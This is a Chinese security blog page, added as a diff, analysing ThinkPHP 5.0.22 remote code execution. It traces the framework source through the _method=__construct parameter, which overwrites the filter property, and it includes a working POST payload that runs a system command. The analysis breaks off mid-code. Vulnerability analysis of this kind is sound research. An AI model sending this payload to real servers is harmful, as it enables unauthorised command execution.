@@ -1,0 +1,1564 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Thinkphp5 RCE 分析, 个人blog,信息安全学习记录,生活,学习">
+    <meta name="description" content="信息安全学习记录">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Thinkphp5 RCE 分析 | EASY</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="EASY" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">EASY</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/mybook/book/" class="waves-effect waves-light">
+      
+      <i class="fas fa-quran" style="zoom: 0.6;"></i>
+      
+      <span>Gitbook</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">EASY</div>
+        <div class="logo-desc">
+            
+            信息安全学习记录
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/mybook/book/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-quran"></i>
+			
+			Gitbook
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://picbed.easy233.top//imgimage-20201213171617698.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Thinkphp5 RCE 分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-12-11
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开始前可以看一下大佬的<a href="https://y4er.com/post/thinkphp5-source-read/" target="_blank" rel="noopener">Thinkphp5 源码阅读</a> 了解thinkphp5的基本运行流程。</p>
+<p>thinphp的rce方法在不同版本利用方式不同，但主要的rce原因有两个:</p>
+<ul>
+<li><code>thinkphp/library/think/Request.php</code>中method方法可控制该类的任意方法导致核心属性<code>filter</code>被覆盖而导致RCE</li>
+<li>未开启强制路由导致rce</li>
+</ul>
+<p>下面我对这两种方法分别进行分析。</p>
+<h2 id="method-contruct导致的rce"><a href="#method-contruct导致的rce" class="headerlink" title="method __contruct导致的rce"></a>method __contruct导致的rce</h2><p>环境使用的是thinkphp5.0.22,<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">官方下载链接</a></p>
+<h3 id="开启debug模式下RCE"><a href="#开启debug模式下RCE" class="headerlink" title="开启debug模式下RCE"></a>开启debug模式下RCE</h3><p>该版本默认的debug是关闭的，debug是否关闭都有rce的方法为了更好的讲解该漏洞我们首先把debug开启。看看在debug下如何RCE。</p>
+<p>thinkphp首先使用我们的payload测试一下:</p>
+<pre><code>http://easy.test/thinkphp_5.0.22_with_extend_3/public/index.php
+POST:
+_method=__construct&amp;filter[]=system&amp;get[]=ipconfig</code></pre><p>如下图成功执行命令:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201213163128578.png" alt=""></p>
+<p>没有问题后我们开始漏洞分析:</p>
+<p>先简单看一下流程<code>thinkphp/library/think/App.php</code>下的<code>run</code>方法，下面部分默认没有跳入的代码省略。</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">?</span> Request<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$request</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token variable">$config</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">initCommon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token comment" spellcheck="true">// 获取应用调度信息</span>
+        <span class="token variable">$dispatch</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$dispatch</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 未设置调度信息则进行 URL 路由检测</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$dispatch</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">routeCheck</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string">'[ ROUTE ] '</span> <span class="token punctuation">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string">'[ HEADER ] '</span> <span class="token punctuation">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string">'[ PARAM ] '</span> <span class="token punctuation">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token punctuation">}</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+        <span class="token variable">$data</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">HttpResponseException</span> <span class="token variable">$exception</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>首先初始化<code>$request</code>这个大数组，<code>self::initCommon();</code>初始化公共配置。未设置调度信息则进行 URL 路由检测<code>self::routeCheck($request, $config);</code>默认进入。</p>
+<p>我们来看看<code>routeCheck</code>方法:</p>
+<pre class=" language-php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">routeCheck</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$config</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$depr</span>   <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'pathinfo_depr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 路由检测</span>
+        <span class="token variable">$check</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeCheck</span><span class="token punctuation">)</span> <span class="token operator">?</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeCheck</span> <span class="token punctuation">:</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_route_on'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 开启路由</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">RUNTIME_PATH</span> <span class="token punctuation">.</span> <span class="token string">'route.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// 读取路由缓存</span>
+                <span class="token variable">$rules</span> <span class="token operator">=</span> <span class="token keyword">include</span> <span class="token constant">RUNTIME_PATH</span> <span class="token punctuation">.</span> <span class="token string">'route.php'</span><span class="token punctuation">;</span>
+                <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">rules</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'route_config_file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">CONF_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token constant">CONF_EXT</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token comment" spellcheck="true">// 导入路由配置</span>
+                        <span class="token variable">$rules</span> <span class="token operator">=</span> <span class="token keyword">include</span> <span class="token constant">CONF_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token constant">CONF_EXT</span><span class="token punctuation">;</span>
+                        <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token comment" spellcheck="true">// 路由检测（根据路由定义返回不同的URL调度）</span>
+            <span class="token variable">$result</span> <span class="token operator">=</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$depr</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_domain_deploy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$must</span>   <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeMust</span><span class="token punctuation">)</span> <span class="token operator">?</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeMust</span> <span class="token punctuation">:</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_route_must'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$must</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// 路由无效</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RouteNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$result</span> <span class="token operator">=</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseUrl</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$depr</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'controller_auto_search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>这里并不重要简单的说一下整个流程进入if语句块，如果有路由缓存会读路由缓存，没有的话会读<code>/application/route.php</code>导入路由，经过<code>Route::check()</code>后，会拿<code>$config[&#39;url_route_must&#39;]</code>来判断是否是强路由。而默认不适用强路为<code>false</code>,而如果是强路由会抛出<code>throw new RouteNotFoundException()</code> 异常，如果没有开启强路由会进入<code>Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;])</code>自动解析<code>模块/控制器/操作/参数</code></p>
+<p>这里我们主要关注其<code>Route::check()</code>方法在这里我们可以看到前文说到的该漏洞触发的调用核心方法<code>method</code>方法</p>
+<pre><code>$method = strtolower($request-&gt;method());</code></pre><p>跟进该方法看看:<br>位于<code>thinkphp/library/think/Request.php</code>中</p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201213155308680.png" alt=""></p>
+<p>通过上图可以看出通过POST一个<code>_method</code>参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定<code>_method</code>即可完成对该类的任意方法的调用，其传入对应的参数即对应的<code>$_POST</code>数组。</p>
+<p>这里可利用方法为<code>__construct</code>方法:</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">property_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> Config<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'default_filter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// 保存 php://input</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">input</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>可以看出其调用<code>foreach</code>方法对<code>Request</code>的成员属性替换成<code>options</code>数组中对应的值，而正是我们传入POST数组。</p>
+<p>其中<code>$this-&gt;filter</code>保存着全局过滤规则，使用我们的payload覆盖后相关的变量变为:</p>
+<pre><code>$this
+    get = {array} [0]
+        0 = dir
+    filter =  {array} [0]
+        0 = system</code></pre><p>我们放回<code>run</code>方法中。当我们开始debug模式的时候我们可以看到其会调用</p>
+<p><code>$request-&gt;param()</code>方法</p>
+<p><img src="https://picbed.easy233.top//imgimgimage-20201213170038251.png" alt=""></p>
+<p>更进该方法：</p>
+<pre class=" language-php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
